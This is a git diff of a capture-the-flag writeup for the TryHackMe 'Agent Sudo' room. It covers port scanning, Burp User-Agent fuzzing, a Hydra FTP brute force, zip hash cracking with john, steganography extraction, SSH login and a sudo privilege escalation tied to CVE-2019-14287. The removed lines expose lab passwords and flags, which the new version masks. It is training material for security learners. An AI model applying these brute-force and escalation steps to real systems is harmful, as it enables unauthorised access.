@@ -1,8 +1,33 @@
 # Try Hack Me Writeup - Agent Sudo
 
-This is a full detailed writeup of the TryHackme - `Agent Sudo` room: https://tryhackme.com/room/agentsudoctf
+You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
 
-*Don't be confused by the 2 different IP addresses show on the screenshots in this writeup. I had to redo this partially due missing screenshots for this writeup.*
+TryHackMe room: <https://tryhackme.com/room/agentsudoctf>
+
+**WARNING: I stripped out the answers, passwords, flags and co. This writeup is pretty detailed. By following and doing the steps described here yourself you will get them all. The goal is to learn more about it, even if you get stuck at some point. Enjoy!**
+
+*PS. Don't be confused by the 2 different IP addresses show on the screenshots in this writeup. I had to redo this partially due missing screenshots for this writeup.*
+
+## Table of Contents
+
+- [Room author note](#room-author-note)
+- [Tools Used](#tools-used)
+- [Setup](#setup)
+- [Enumeration ports and services](#enumeration-ports-and-services)
+- [Handling the Web Server](#handling-the-web-server)
+  - [Playing with the User Agent](#playing-with-the-user-agent)
+- [Hash cracking and brute-force](#hash-cracking-and-brute-force)
+- [Handling the hidden data in the files](#handling-the-hidden-data-in-the-files)
+- [Capture the user flag](#capture-the-user-flag)
+- [Privilege escalation](#privilege-escalation)
+
+## Room author note
+
+Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!
+
+If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.
+
+![alt text](images/writeup-logo.png "Room Logo")
 
 ## Tools Used
 
@@ -15,29 +40,20 @@ This is a full detailed writeup of the TryHackme - `Agent Sudo` room: https://tr
 * `steghide`, `binwalk` - Get info and extract image files (steganography)
 * `john`, `zip2john` - To crack the zip file.
 
-## Task 1 - Author note
+## Setup
 
-Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!
+To make things more easy, I will create an environment variable which will hold the target's IP address. And then when needed for an app, refer to it. But this before I run `tmux`.
 
-If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.
+```
+$ export IP=10.10.216.225
+$ tmux
+```
 
-![alt text](images/writeup-logo.png "Room Logo")
-
-## Task 2 - Enumerate
+## Enumeration ports and services
 
 **Enumerate the machine and get all the important information**
 
 First, enumerate the ports of the victim which has the ip `10.10.216.225`. Like this is an easy Capture The Flag exercise, I go like a pig and scan all ports.
-
-To make things more easy, I will create an environment variable which will hold the victims IP address. And then when needed for an app, refer to it. I'm tired to type in wrong ip's or forget them :-D
-
-```
-$ export IP=10.10.216.225
-$ echo $IP
-10.10.216.225
-```
-
-### nmap - Enumeration of the server ports
 
 ```commandline
 # nmap -p- -A $IP
@@ -82,7 +98,7 @@ Nmap done: 1 IP address (1 host up) scanned in 40.24 seconds
 
 3 ports open: `ftp`, `ssh` and `http` on an `Ubuntu` machine. According to my `nmap` scan result, the ftp server is not with anonymous login. So I will not try to connect to `ftp`. I need more hints to start with.
 
-### Handling the Web Server
+## Handling the Web Server
 
 So I will first take a look on the web server.
 
@@ -120,7 +136,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 File and directory crawling didn't give any hints. So we can forget this.
 
-#### Playing with the User Agent
+### Playing with the User Agent
 
 With the `Intruder` feature of the `Burp Suite` tool we can easily do a mass attack. Note that we need to have some proxy tool in the web browser, for this I used [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search) which will redirect everything to `127.0.0.1` on port `8080`. Just the standard config for `Burp Suite` which then intercept all the data and forward back to the web browser. Once `FoxyProxy` configured and enabled for `Burp`, I started up the `Burp Suite` tool. 
 
@@ -204,7 +220,7 @@ Note to myself, don't forget to press that `Reset` button in the `User-Agent Swi
 
     chris
 
-## Task 3 - Hash cracking and brute-force
+## Hash cracking and brute-force
 
 Done enumerate the machine? Time to brute your way out.
 
@@ -220,12 +236,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-03 03:26:
 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
 [DATA] attacking ftp://10.10.216.225:21/
-[21][ftp] host: 10.10.216.225   login: chris   password: crystal
+[21][ftp] host: 10.10.216.225   login: chris   password: *******
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-03 03:28:06
 ```
 
-So, we have a username (`chris`) and password (`crystal`) to access the `ftp` server. Let's take a look at what we will find there.
+So, we have a username and a password to access the `ftp` server. Let's take a look at what we will find there.
 
 ```commandlinec
 $ ftp $IP
@@ -257,7 +273,7 @@ ftp> bye
 221 Goodbye.
 ```
 
-Used the `mget` command followed with the `*` (asterisks) to grab all files. I had to confirm for each file. Is more handy than using the `get` command.
+Used the `mget` command followed with the `*` (asterisks) to grab all files. I had to confirm for each file. Is more handy than using the `get` command. Well, it would be more handy if I had used the command `prompt off`, so I should not have had to confirm for each file. But too late.
 
 So, download 3 files: `To_agentJ.txt`, `cute-alien.jpg`, `cutie.png`
 
@@ -338,7 +354,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
 Will run 8 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-alien            (8702.zip/To_agentR.txt)
+a***n            (8702.zip/To_agentR.txt)
 1g 0:00:00:00 DONE (2021-08-03 23:22) 4.166g/s 136533p/s 136533c/s 136533C/s christal..eatme1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
@@ -350,22 +366,20 @@ We have some secret message again!
 $ cat To_agentR.txt                                                                                                    
 Agent C,
 
-We need to send the picture to 'QXJlYTUx' as soon as possible!
+We need to send the picture to 'Q******x' as soon as possible!
 
 By,
 Agent R
 ```
 
-After some research the `QXJlYTUx` seems to be encoded in base64.
+After some research the `Q******x` seems to be encoded in base64.
 
 ```commandline
-echo 'QXJlYTUx' > encrypted_data.txt
-base64 -d encrypted_data.txt > decrypted_data.txt
-cat decrypted_data.txt
-Area51
+echo "Q******x" | base64 -d
+A****1
 ```
 
-Let's take a look again to the `cute-alien.jpg` file and try to extract it with the password `Area51` we just got.
+Let's take a look again to the `cute-alien.jpg` file and try to extract it with the password we just got.
 
 ```commandline
 $ steghide extract -sf cute-alien.jpg                                                                                  
@@ -379,7 +393,7 @@ The file `message.txt` contains very valuable information!
 $ cat message.txt                                                                                                      
 Hi james,
 
-Glad you find this message. Your login password is hackerrules!
+Glad you find this message. Your login password is h**********!
 
 Don't ask me why the password look cheesy, ask agent R who set this password for you.
 
@@ -387,10 +401,9 @@ Your buddy,
 chris
 ```
 
-
 ### Answer the questions below
 
-We can now log in with user `james` and password `hackerrules!`. Found the `user_flag.txt` and `Alien_autospy.jpg` file.
+We can now log in with user `james` and password his password. Found the `user_flag.txt` and `Alien_autospy.jpg` file.
 
 ```commandline
 $ ssh james@$IP                                                                                                        
@@ -430,46 +443,12 @@ drwx------ 3 james james 4.0K Oct 29  2019 .gnupg
 -rw-r--r-- 1 james james    0 Oct 29  2019 .sudo_as_admin_successful
 -rw-r--r-- 1 james james   33 Oct 29  2019 user_flag.txt
 james@agent-sudo:~$ cat user_flag.txt 
-b03d975e8c92a7c04146cfa7a5a313c7
+b*****5e8c92a7c04146cfa7a*****c7
 ```
 
 I have look to that `Alien_autospy`.jpg and can tell you that it's better not to look at it just before eating. I had uploaded this to Google images and had to do a lot of research to get the answer of this file. The `Roswell Alien Autopsy`. You can read more here https://en.wikipedia.org/wiki/Roswell_incident
 
-**FTP password**
-
-    crystal
-
-**Zip file password**
-
-    alien
-
-**steg password**
-
-    Area51
-
-**Who is the other agent (in full name)?**
-
-    James
-
-**SSH password**
-
-    hackerrules!
-
-## Task 4 - Capture the user flag
-
-**You know the drill.**
-
-### Answer the questions below
-
-**What is the user flag?**
-
-    b03d975e8c92a7c04146cfa7a5a313c7
-
-**What is the incident of the photo called?**
-
-    roswell alien autopsy
-
-## Task 5 - Privilege escalation
+## Privilege escalation
 
 **Enough with the extraordinary stuff? Time to get real.**
 
@@ -491,24 +470,8 @@ To Mr.hacker,
 Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
 
 Your flag is 
-b53a02f55b57d4439e3341834d70c062
+b5*****55b57d4439e33*****d2
 
 By,
 DesKel a.k.a Agent R
 ```
-
-### Answer the questions below
-
-**CVE number for the escalation (Format: CVE-xxxx-xxxx)**
-
-    CVE-2019-14287
-
-Interesting info about CVE-2019-14287: https://www.exploit-db.com/exploits/47502
-
-**What is the root flag?**
-
-    b53a02f55b57d4439e3341834d70c062
-
-**(Bonus) Who is Agent R?**
-
-    DesKel
